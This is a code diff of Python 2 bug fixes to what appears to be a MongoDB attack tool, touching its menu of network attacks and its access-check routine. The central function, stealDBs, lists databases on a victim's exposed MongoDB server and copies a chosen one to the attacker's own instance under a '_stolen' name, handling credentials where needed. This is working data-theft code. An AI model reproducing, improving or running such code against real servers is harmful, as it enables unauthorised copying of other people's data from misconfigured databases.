@@ -490,8 +490,11 @@ def netAttacks(target):
 				enumGrid(conn)
 			
 			if attack == "4":
-				print "\n"
-				stealDBs(myIP,conn)
+				if optionSet[4] == False:
+					print "Target database not set!"
+				else:
+					print "\n"
+					stealDBs(myIP,conn)
 			
 			if attack == "5":
 				print "\n"
@@ -1460,21 +1463,17 @@ def stealDBs(myDB,mongoConn):
 	while dbLoot:
 		dbLoot = raw_input("Select a database to steal:")
 		
-		if dbLoot > menuItem:
+		if int(dbLoot) > menuItem:
 			print "Invalid selection."
 		
 		else:
-			dbLoot = False
+			break
 		
 	try:
 		#Mongo can only pull, not push, connect to my instance and pull from verified open remote instance.
 		dbNeedCreds = raw_input("Does this database require credentials (y/n)? ")
 		
 		if dbNeedCreds in no_tag:
-			if optionSet[4] == False:
-				raw_input("No IP specified to copy to! Press enter to return to main menu...")
-				return
-			
 			myDBConn = pymongo.MongoClient(myDB,27017)
 			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)	
 		
@@ -1495,8 +1494,8 @@ def stealDBs(myDB,mongoConn):
 		else:
 			return
 	
-	except:
-		if str(sys.exc_info()).find('text search not enabled') != -1:
+	except Exception, e:
+		if str(e).find('text search not enabled') != -1:
 			raw_input("Database copied, but text indexing was not enabled on the target.  Indexes not moved.  Press enter to return...")
 			return
 		
@@ -1543,8 +1542,8 @@ def accessCheck(ip,port,pingIt):
 				conn.disconnect()
 				return [0,dbVer]
 		
-			except:
-				if str(sys.exc_info()).find('need to login') != -1:
+			except Exception, e:
+				if str(e).find('need to login') != -1:
 					conn.disconnect()
 					return [1,None]
 			
